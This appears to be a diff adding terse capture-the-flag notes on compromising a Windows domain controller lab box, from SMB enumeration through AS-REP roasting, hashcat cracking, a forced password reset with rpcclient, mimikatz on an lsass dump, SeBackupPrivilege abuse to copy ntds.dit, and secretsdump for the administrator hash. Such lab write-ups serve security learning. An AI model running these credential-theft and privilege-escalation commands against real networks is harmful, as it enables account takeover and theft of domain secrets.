@@ -1,0 +1,19 @@
+nmap -->> port 445 -->> smbclient users share -->> list of usernames
+kerberoasting -->> impacket/GetNPUsers with usernames -->> support user hash 
+hashcat -->> plaintext password
+rpcclient as support -->> enumprivs -->> can change password -->> audit2020 password change to only 'ASDqwe123'
+	command : setuserinfo2 audit2020 23 'ASDqwe123'
+smbclient as audit2020 -->> forensics share -->> memory_analysis -->> lsass dump
+mimikatz -->> hash for svc_support (works) and admin (not working)
+logging in as svc_support -->> user.txt
+whoami /privs -->> shows we have backup privileges (SeBackupPrivilege)
+	https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
+follow the blog to get the ntds.dit
+	https://pentestlab.blog/tag/diskshadow/ -->> just in add another letter or number after each line
+import the following dlls to get the ntds.dit
+		https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
+copy ntds.dit to temp -->> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
+copy the system file -->> reg save HKLM\SYSTEM c:\temp\system
+download both ntds.dit and system
+impacket-secretsdump.py -->> get admin hash -->> root.txt
+	secretsdump.py -ntds ntds.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
